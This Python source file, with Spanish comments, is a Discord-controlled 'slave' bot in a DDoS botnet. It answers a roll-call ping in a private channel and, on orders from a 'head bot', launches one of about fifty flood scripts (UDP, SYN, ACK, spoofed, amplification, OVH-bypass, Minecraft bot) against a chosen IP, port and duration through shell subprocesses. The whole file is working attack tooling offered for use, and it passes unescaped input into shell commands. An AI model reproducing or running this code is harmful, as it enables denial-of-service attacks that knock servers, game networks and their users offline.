import os
import discord
from discord.ext import commands
import asyncio
import random

# === CONFIGURACIÓN ===
TOKEN = os.getenv("KEYS")  # Token del bot esclavo
PRIVATE_CHANNEL_ID = 1439628382605283369  # Canal privado
BOT_ID = os.getenv("BOT_ID", f"BOT_{random.randint(1000, 9999)}")  # ID único

# Cooldown por método para evitar spam
cooldowns = {}

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='.', intents=intents)

@bot.event
async def on_ready():
    print(f'✅ Bot esclavo conectado: {bot.user.name}')
    print(f'📡 ID: {BOT_ID}')
    print(f'🔒 Escuchando en canal privado: {PRIVATE_CHANNEL_ID}')
    await bot.change_presence(activity=discord.Game(name=f"{BOT_ID} | Esclavo"))

@bot.event
async def on_message(message):
    # Solo procesar mensajes en el canal privado
    if message.channel.id != PRIVATE_CHANNEL_ID:
        return
    
    # RESPONDER AL PING .concs - ENVIAR ID AL CANAL PRIVADO
    if message.content == ".concs":
        await message.channel.send(BOT_ID)
        print(f"📡 {BOT_ID} respondió a .concs")
        return
    
    # EJECUTAR COMANDOS DEL HEAD BOT (formato: BOT_ID .metodo ip port time)
    if message.content.startswith(BOT_ID):
        try:
            # Extraer comando después del ID
            comando_completo = message.content[len(BOT_ID):].strip()
            print(f"🎯 {BOT_ID} recibió: {comando_completo}")
            
            # Parsear partes
            partes = comando_completo.split()
            if len(partes) < 4:
                print(f"⚠️ Comando incompleto: {comando_completo}")
                return
            
            metodo = partes[0].replace('.', '')
            ip = partes[1]
            port = partes[2]
            tiempo = partes[3]
            
            # Verificar cooldown por método
            current_time = asyncio.get_event_loop().time()
            if metodo in cooldowns:
                time_left = cooldowns[metodo] - current_time
                if time_left > 0:
                    print(f"⏰ {BOT_ID} cooldown para {metodo}: {int(time_left)}s")
                    return
            
            # Parámetros adicionales para mcbot
            nombre = partes[4] if len(partes) > 4 else None
            bots = partes[5] if len(partes) > 5 else None
            regcmd = partes[6] if len(partes) > 6 else None
            mensaje = partes[7] if len(partes) > 7 else None
            intervalo = partes[8] if len(partes) > 8 else None
            
            # Aplicar cooldown de 10 segundos para el método
            cooldowns[metodo] = current_time + 10
            asyncio.create_task(clear_cooldown(metodo, 10))
            
            # Ejecutar ataque
            if metodo == 'mcbot':
                await ejecutar_mcbot(ip, port, nombre, bots, tiempo, regcmd, mensaje, intervalo)
            else:
                await ejecutar_ataque(metodo, ip, port, tiempo)
            
            print(f"✅ {BOT_ID} ejecutó: {metodo} {ip}:{port} {tiempo}s")
            
        except Exception as e:
            print(f"❌ Error en {BOT_ID}: {e}")
    
    await bot.process_commands(message)

async def clear_cooldown(metodo, duration):
    await asyncio.sleep(duration)
    if metodo in cooldowns:
        del cooldowns[metodo]

async def ejecutar_ataque(metodo: str, ip: str, port: str, tiempo: str):
    """Ejecutar ataque en el sistema local"""
    try:
        port_int = int(port)
        tiempo_int = int(tiempo)
    except ValueError:
        print(f"❌ Puerto o tiempo inválidos: {port}/{tiempo}")
        return
    
    comandos = {
        'udp': f'python3 udpflood.py {ip} {port_int} {tiempo_int}',
        'icmpgame': f'sudo ./icmpgame {ip} {port_int} {tiempo_int}',
        'raknetv2': f'go run raknetv2.go {ip} {port_int} {tiempo_int}',
        'mixgame': f'python3 mixgame.py {ip} {port_int} {tiempo_int}',
        'udpbypassv2': f'sudo ./udpbypassv2 {ip} {port_int} {tiempo_int}',
        'udpserver': f'python3 udpserver.py {ip} {port_int} {tiempo_int}',
        'raknet': f'python3 raknet.py {ip} {port_int} {tiempo_int}',
        'udpdns': f'python3 udpdns.py {ip} {port_int} {tiempo_int}',
        'udpchecksum': f'python3 udpchecksum.py {ip} {port_int} {tiempo_int}',
        'land': f'python3 land.py {ip} {port_int} {tiempo_int}',
        'syn': f'python3 syn.py {ip} {port_int} {tiempo_int}',
        'ack': f'python3 ack.py {ip} {port_int} {tiempo_int}',
        'tcpgame': f'python3 tcpgame.py {ip} {port_int} {tiempo_int}',
        'gamepps': f'python3 gamepps.py {ip} {port_int} {tiempo_int}',
        'tcpbypass': f'python3 tcpbypass.py {ip} {port_int} {tiempo_int}',
        'udpping': f'python3 udpping.py {ip} {port_int} {tiempo_int}',
        'udpsql': f'python3 udpsql.py {ip} {port_int} {tiempo_int}',
        'udpsockets': f'python3 udpsockets.py {ip} {port_int} {tiempo_int}',
        'udphandshake': f'python3 udphandshake.py {ip} {port_int} {tiempo_int}',
        'icmpbypass': f'python3 icmpbypass.py {ip} {port_int} {tiempo_int}',
        'icmp': f'python3 icmp.py {ip} {port_int} {tiempo_int}',
        'ovhpps': f'python3 ovhpps.py {ip} {port_int} {tiempo_int}',
        'udppayload': f'python3 udppayload.py {ip} {port_int} {tiempo_int}',
        'udptls': f'python3 udptls.py {ip} {port_int} {tiempo_int}',
        'udpplain': f'python3 udpplain.py {ip} {port_int} {tiempo_int}',
        'udpfrag': f'python3 udpfrag.py {ip} {port_int} {tiempo_int}',
        'udpquery': f'python3 udpquery.py {ip} {port_int} {tiempo_int}',
        'stdhex': f'python3 stdhex.py {ip} {port_int} {tiempo_int}',
        'udpspoof': f'python3 udpspoof.py {ip} {port_int} {tiempo_int}',
        'hex': f'./hex {ip} {port_int} {tiempo_int}',
        'kill': f'python3 kill.py {ip} {port_int} {tiempo_int}',
        'udppps': f'./udppps {ip} {port_int} {tiempo_int}',
        'ovhbypass': f'./ovhbypass {ip} {port_int} {tiempo_int}',
        'ovhudp': f'sudo ./ovhudp {ip} {port_int} 40 -1 {tiempo_int}',
        'dns': f'python3 dns.py {ip} {port_int} {tiempo_int}',
        'ovhtcp': f'sudo ./ovhtcp {ip} {port_int} 40 -1 {tiempo_int}',
        'tcp': f'sudo ./tcp {ip} {port_int} {tiempo_int}',
        'tcpmix': f'python3 tcpmix.py {ip} {port_int} {tiempo_int}',
        'mix': f'python3 mix.py {ip} {port_int} {tiempo_int}',
        'udpraw': f'python3 udpraw.py {ip} {port_int} {tiempo_int}',
        'udpflood': f'./udp {ip} {port_int} {tiempo_int}',
        'udpstorm': f'python3 udpstorm.py {ip} {port_int} {tiempo_int}',
        'udpgame': f'python3 udpgame.py {ip} {port_int} {tiempo_int}',
        'udpamp': f'python3 udpamp.py {ip} {port_int} {tiempo_int}',
        'udpbypass': f'python3 udpbypass.py {ip} {port_int} {tiempo_int}',
        'udpvse': f'python3 udpvse.py {ip} {port_int} {tiempo_int}',
        'udpsyn': f'python3 udpsyn.py {ip} {port_int} {tiempo_int}',
        'udphttp': f'python3 udphttp.py {ip} {port_int} {tiempo_int}',
        'udpkill': f'python3 udpkill.py {ip} {port_int} {tiempo_int}',
        'gameboom': f'python3 gameboom.py {ip} {port_int} {tiempo_int}',
    }
    
    comando = comandos.get(metodo)
    if not comando:
        print(f"❌ Método desconocido: {metodo}")
        return
    
    print(f"⚔️ {BOT_ID} atacando: {metodo.upper()} {ip}:{port} | {tiempo}s")
    try:
        proceso = await asyncio.create_subprocess_shell(
            comando,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        await proceso.wait()
        print(f"✅ {BOT_ID} completó: {metodo} {ip}:{port}")
    except Exception as e:
        print(f"❌ {BOT_ID} error: {e}")

async def ejecutar_mcbot(ip: str, port: str, nombre: str, bots: str, tiempo: str, regcmd: str, mensaje: str, intervalo: str):
    """Ejecutar ataque mcbot - CORREGIDO"""
    try:
        port_int = int(port)
        tiempo_int = int(tiempo)
        bots_int = int(bots) if bots else 10
    except ValueError:
        print(f"❌ Puerto o tiempo inválidos")
        return
    
    # Comando mcbot con todos los parámetros correctamente formateados
    comando = f'python3 mcbot.py {ip} {port_int} "{nombre}" {bots_int} {tiempo_int} "{regcmd}" "{mensaje}" {intervalo}'
    
    print(f"⚔️ {BOT_ID} atacando: MCBOT {ip}:{port} | {tiempo}s | Bots: {bots_int}")
    print(f"📝 Comando: {comando}")
    try:
        proceso = await asyncio.create_subprocess_shell(
            comando,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        await proceso.wait()
        print(f"✅ {BOT_ID} completó: MCBOT {ip}:{port}")
    except Exception as e:
        print(f"❌ {BOT_ID} error en MCBOT: {e}")

if __name__ == "__main__":
    if not TOKEN:
        print("❌ ERROR: Variable KEYS no configurada")
    else:
        print(f"Iniciando bot esclavo {BOT_ID}...")
        bot.run(TOKEN)
